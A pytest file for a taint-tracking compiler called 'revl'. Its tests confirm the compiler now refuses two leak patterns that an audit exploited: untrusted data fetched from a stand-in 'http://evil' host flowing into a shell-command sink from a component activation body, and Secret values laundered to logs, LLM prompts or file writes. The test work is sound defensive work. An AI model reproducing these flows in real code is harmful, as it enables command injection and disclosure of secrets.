"""Activation-body enforcement, and the `Secret[T]` receiver's own body.

Two confidentiality holes an adversarial audit found with executed exploits, both
in `revl.taint`, both closed here.

**Hole 1 — the activation body was analysed by nothing.**
`_walk_component_methods` descended only into `provide` steps, so every other
statement of a component activation body was skipped. The only enforcing
`_FlowChecker` instances covered top-level `fn` bodies and `provide` methods; the
one walk that did visit the activation body (`_infer_state_env`) runs with
`enforce=False`, purely to seed the component-state fixed point. So an `emit`
written directly in an activation body faced no refusal at all: the same
`emit run(fetch(...))` that is correctly refused with G9 inside a `provide` method
compiled clean at activation. This matters because the activation body is exactly
where `examples/migrator.rvl` and `examples/fault_sweep_two_phase.rvl` teach
authors to write emissions.

**Hole 2 — a `Secret[T]` receiver laundered `confidential` away in its own body.**
A `Secret[T]` parameter was recorded only in `TaintModel.secret_receivers`, which
is consulted at the CALL SITE to admit the crossing; the qualifier was then
stripped and nothing seeded the parameter's taint inside the implementing body.
There was no `confidential_params` counterpart to `untrusted_params`. So the
receiver saw a bare `Str` with empty taint and could hand it to a log, an LLM
prompt or `fs.write` — a self-mintable universal declassifier, needing no
`endorse`, leaving no `declassify:confidential` token, invisible to audit.

The line both fixes draw: a `Secret[T]` declaration authorises the crossing TO the
receiver, never onward disclosure. Declassification stays the explicit, audited
`endorse[confidential]` edge (§7c).
"""

from __future__ import annotations

import pytest

from revl import RevlError
from revl.compiler import compile_source

_PRELUDE = (
    "extern emission[web] fn fetch(u: Str) -> Untrusted[Str] "
    "= @py { return u }\n"
    "extern emission[shell] fn run(cmd: Trusted[Str]) -> Int = @py { return 0 }\n"
    "extern emission[payment.charge] fn charge(a: Str) -> Secret[Str] "
    "= @py { return a }\n"
    "extern emission[log] fn logit(m: Str) -> Int = @py { return 0 }\n"
    "extern emission[fs.write] fn to_json(m: Str) -> Int = @py { return 0 }\n"
    "extern emission[model.complete] fn prompt(p: Str) -> Str = @py { return p }\n"
)


def _activation(body: str, extra: str = "") -> str:
    """A component whose ACTIVATION body (not a `provide` method) runs `body`."""
    return (
        _PRELUDE + extra
        + "service Ops { emission fn go(u: Str) -> Int }\n"
        + "component Agent provides ops: Ops {\n"
        + body + "\n"
        + "  provide ops {\n    fn go(u) {\n      return 0\n    }\n  }\n}\n")


def _code_of(src: str) -> str | None:
    try:
        compile_source(src, "act.rvl")
        return None
    except RevlError as e:
        return getattr(e, "code", None)


def _refuses(src: str, code: str) -> RevlError:
    with pytest.raises(RevlError) as excinfo:
        compile_source(src, "act.rvl")
    err = excinfo.value
    assert getattr(err, "code", None) == code, (
        f"expected {code}, got {getattr(err, 'code', None)}: {err.message}")
    return err


# ===========================================================================
# 1. Hole 1: the activation body faces the same refusals a provide method does.
# ===========================================================================

def test_activation_body_untrusted_into_a_shell_sink_is_refused():
    """The audit's executed exploit: `emit run(fetch("http://evil"))` written
    directly in an activation body compiled clean and the shell command ran. The
    byte-identical flow inside a `provide` method was already refused with G9 —
    the inferred signature was correct, the `emit` site simply never reached
    `_check_sinks`."""
    err = _refuses(_activation('  emit run(fetch("http://evil"))'), "G9")
    assert "shell command" in err.message
    assert "`run`" in err.message


def test_the_same_flow_in_a_provide_method_was_and_stays_refused():
    """The control: the hole was the SITE, never the analysis. Both sites now
    agree, which is the whole point of the fix."""
    src = (
        _PRELUDE
        + "service Ops { emission fn go(u: Str) -> Int }\n"
        + "component Agent provides ops: Ops {\n  provide ops {\n"
        + "    fn go(u) {\n      emit run(fetch(\"http://evil\"))\n"
        + "      return 0\n    }\n  }\n}\n")
    assert _code_of(src) == "G9"


def test_activation_body_secret_into_a_log_is_refused():
    """A `Secret[T]` value reaching a log from an activation body is a disclosure
    sink exactly as it is from a provide method (§7b)."""
    err = _refuses(_activation('  emit logit(charge("card"))'), "G-SECRET-FLOW")
    assert "disclosure sink" in err.message


def test_activation_body_secret_into_a_model_prompt_is_refused():
    """A `model.*` emission argument is an LLM prompt — a disclosure sink."""
    _refuses(_activation('  emit prompt(charge("card"))'), "G-SECRET-FLOW")


def test_activation_body_secret_into_fs_write_is_refused():
    _refuses(_activation('  emit to_json(charge("card"))'), "G-SECRET-FLOW")


def test_activation_body_untrusted_reaches_a_sink_through_a_helper_fn():
    """The transitive tier reaches the activation body too: the callee's inferred
    signature is applied at an activation-body call site, not only inside a
    provide method."""
    src = _activation(
        '  emit wash(fetch("http://evil"))',
        extra="fn wash(c: Str) -> Int { return run(c) }\n")
    assert _code_of(src) == "G9"


# ===========================================================================
# 2. Hole 1, the other direction: honest activation bodies still compile.
# ===========================================================================

def test_a_clean_activation_body_emission_still_compiles():
    """The false-positive guard. A legitimate activation-body emission carrying
    only literal, trusted data is untouched — the new pass refuses flows, never
    activation-body emissions as such."""
    assert _code_of(_activation('  emit run("ls -la")')) is None


def test_a_clean_activation_body_emission_of_untainted_extern_data():
    src = _activation(
        '  emit run(shape("ls"))',
        extra="extern fn shape(s: Str) -> Str = @py { return s }\n")
    assert _code_of(src) is None


def test_an_activation_body_secret_reaching_a_declared_receiver_compiles():
    """A `confidential` value crossing to a DECLARED `Secret[T]` receiver is the
    one admitted crossing, from an activation body as from anywhere else."""
    src = (
        _PRELUDE
        + "service Keep { emission fn hold(y: Secret[Str]) -> Int }\n"
        + "service Ops { emission fn go(u: Str) -> Int }\n"
        + "component Agent requires k: Keep provides ops: Ops {\n"
        + '  emit k.hold(charge("card"))\n'
        + "  provide ops {\n    fn go(u) {\n      return 0\n    }\n  }\n}\n")
    assert _code_of(src) is None


def test_an_activation_body_flow_is_reported_once():
    """The `_infer_state_env` seeding sweep stays non-enforcing, so a component
    that HAS a state world does not report the activation-body refusal twice —
    one enforcing checker walks each activation statement, after the state fixed
    point has converged."""
    src = (
        _PRELUDE
        + "service Ops { emission fn go(u: Str) -> Int }\n"
        + "component Agent provides ops: Ops {\n"
        + "  let store = effect Map.new() undo store.drop()\n"
        + '  emit run(fetch("http://evil"))\n'
        + "  provide ops {\n    fn go(u) {\n      return 0\n    }\n  }\n}\n")
    with pytest.raises(RevlError) as excinfo:
        compile_source(src, "act.rvl")
    assert getattr(excinfo.value, "code", None) == "G9"


# ===========================================================================
# 3. Hole 2: a `Secret[T]` receiver may not disclose its own parameter.
# ===========================================================================

def _vault(body: str, extra: str = "", reqs: str = "") -> str:
    return (
        _PRELUDE + extra
        + "service Vault { emission fn store(x: Secret[Str]) -> Int }\n"
        + "component Launderer " + reqs + "provides v: Vault {\n"
        + "  provide v {\n    fn store(x) {\n" + body
        + "\n      return 0\n    }\n  }\n}\n")


def test_a_secret_receiver_may_not_log_its_own_parameter():
    """The audit's second executed exploit: one file, one author, no `endorse`.
    The `Secret[T]` declaration was a self-mintable universal declassifier — the
    same value straight into `logit` was correctly refused, but routed through a
    receiver it leaked with `Launderer taint = null` and no
    `declassify:confidential` token on the audit surface."""
    err = _refuses(_vault("      let a = logit(x)"), "G-SECRET-FLOW")
    assert "disclosure sink" in err.message


def test_a_secret_receiver_may_not_prompt_with_its_own_parameter():
    _refuses(_vault("      let a = prompt(x)"), "G-SECRET-FLOW")


def test_a_secret_receiver_may_not_serialize_its_own_parameter():
    _refuses(_vault("      let a = to_json(x)"), "G-SECRET-FLOW")


def test_a_secret_receiver_may_not_launder_through_concatenation():
    """The lattice join holds inside the receiver too: a trusted prefix does not
    launder the confidential suffix."""
    _refuses(_vault('      let a = logit("token=" + x)'), "G-SECRET-FLOW")


def test_a_secret_receiver_may_not_return_its_own_parameter():
    """A provide-method return crosses the service / MCP bridge to a client that
    declared no `Secret[T]` receiver — a disclosure sink (§7b)."""
    src = (
        _PRELUDE
        + "service Vault { emission fn store(x: Secret[Str]) -> Str }\n"
        + "component Launderer provides v: Vault {\n"
        + "  provide v {\n    fn store(x) {\n      return x\n    }\n  }\n}\n")
    assert _code_of(src) == "G-SECRET-FLOW"


def test_a_top_level_fn_secret_param_may_not_reach_a_disclosure_sink():
    """The same seeding covers a top-level `fn` with a `Secret[T]` parameter, not
    only a service operation — the hole was in `_note_params` as well as in the
    service-op arm."""
    src = (
        _PRELUDE
        + "fn leak(x: Secret[Str]) -> Int { return logit(x) }\n"
        + "service Ops { emission fn go(u: Str) -> Int }\n"
        + "component Agent provides ops: Ops {\n  provide ops {\n"
        + "    fn go(u) {\n      let a = leak(charge(u))\n"
        + "      return 0\n    }\n  }\n}\n")
    assert _code_of(src) == "G-SECRET-FLOW"


# ===========================================================================
# 4. Hole 2, the other direction: an honest receiver still compiles.
# ===========================================================================

def test_a_secret_receiver_may_pass_the_value_to_another_declared_receiver():
    """The false-positive guard, and the shape the design intends: a receiver
    threading a confidential value onward to another DECLARED `Secret[T]`
    receiver. Admitted — the crossing is declared on both sides."""
    src = _vault(
        "      emit k.hold(x)",
        extra="service Keep { emission fn hold(y: Secret[Str]) -> Int }\n",
        reqs="requires k: Keep ")
    assert _code_of(src) is None


def test_a_secret_receiver_may_pass_the_value_to_a_secret_extern_receiver():
    """An extern that declares a `Secret[T]` parameter is a declared receiver
    too, so a receiver body may hand its parameter to one."""
    src = _vault(
        "      let a = vault_put(x)",
        extra="extern emission[fs.write] fn vault_put(s: Secret[Str]) -> Int "
              "= @py { return 0 }\n")
    assert _code_of(src) is None


def test_a_secret_receiver_may_use_clean_values_freely():
    """Only the confidential parameter is fenced; the rest of the body moves."""
    assert _code_of(_vault('      let a = logit("stored one token")')) is None


def test_an_explicit_endorse_is_still_the_one_declassification_path():
    """The escape hatch stays the declared, audited one: with
    `endorse[confidential]` granted on the operation, the downgrade is admitted
    AND lands on the audit surface as a `declassify:confidential` token — exactly
    what the implicit laundering path bypassed."""
    src = (
        _PRELUDE
        + "service Vault { emission endorse[confidential] fn "
        + "store(x: Secret[Str]) -> Int }\n"
        + "component Launderer provides v: Vault {\n"
        + "  provide v {\n    fn store(x) {\n"
        + "      let c = endorse[confidential](x, reason = \"redacted digest\")\n"
        + "      let a = logit(c)\n      return 0\n    }\n  }\n}\n")
    ir = compile_source(src, "act.rvl")
    comp = {c["name"]: c for c in ir["components"]}["Launderer"]
    assert "confidential" in comp["taint"]["declassify"]


def test_an_undeclared_endorse_in_a_receiver_is_still_refused():
    """Without the declared slot the downgrade is refused at admission, so the
    audited path cannot be taken silently either."""
    src = _vault(
        "      let c = endorse[confidential](x, reason = \"nope\")\n"
        "      let a = logit(c)")
    assert _code_of(src) == "G9"
